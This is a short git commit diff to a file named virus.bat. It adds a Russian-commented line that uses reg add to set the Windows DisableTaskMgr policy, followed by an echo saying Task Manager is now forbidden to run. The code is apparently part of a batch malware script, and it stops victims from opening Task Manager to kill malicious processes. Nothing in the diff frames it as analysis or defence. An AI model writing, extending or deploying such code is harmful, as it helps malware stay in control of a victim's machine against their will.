81f7657ba292299f6facf7f5d7623108c92d365c
osager-net <RuslanGamidov2015@yandex.ru>
2026-05-04 00:27:28 +0400

    Update virus.bat

--- virus.bat
+++ virus.bat
@@ -39,3 +39,6 @@ if %errorlevel% == 0 (
 
 :end
 
+:: (Запрет открытия диспетчера задач)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
+echo Диспетчер задач запрещён к запуску.
